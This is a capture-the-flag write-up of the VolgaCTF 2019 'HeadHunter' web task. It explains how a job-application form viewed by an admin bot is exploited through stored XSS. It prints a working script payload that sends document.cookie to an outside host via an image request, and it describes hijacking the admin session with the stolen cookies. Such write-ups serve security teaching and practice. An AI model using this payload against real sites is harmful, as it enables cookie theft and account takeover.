Volga CTF 2019 Qualifier: HeadHunter Quest

Hello! From 29 to 31 March was held the qualifying round VolgaCTF .

The organizers prepared a large number of tasks in different categories (by the way, including the new one - fake, tasks for finding disinformation).

The goal of the HeadHunter job, like everyone else, is to obtain a secret key. Getting started we get the WEB.py file and a link to the site.



Vulnerability Search


Immediately follow the link, we see a welcome message. We are registering. In the Vocation tab, we observe a form of several fields: Enter any information and try to send. The form is submitted successfully and on the My Requests List tab we see our application pending. After a couple of tens of seconds, its status changes to ‚Äúviewed‚Äù: Take a look at the attached file.

Attack


This combination of facts suggests thoughts of a possible XSS vulnerability.
We are trying to perform a typical attack and steal cookies using Image src to bypass domain restrictions:

<script language="javascript">
    var img = new Image();
    img.src = 'example.com?' + document.cookie;
    document.body.appendChild(img);
</script>

We assume that there is no protection and the message text is embedded in the DOM without any checks. In this case, the code inside the script tag will begin to execute. It will create an element (picture) and assign it a source, after which it will add an element to the DOM. This, in turn, will force the browser to try downloading it by making a request to our server.

Now just include in the request with the form an additional field with our script, send and wait. The status changes to ‚Äúviewed‚Äù, and a request with cookies in the query parameter comes to the server.

The last step remains - we take the cookies, set them on the site, refresh the page and get the key: The task is solved.
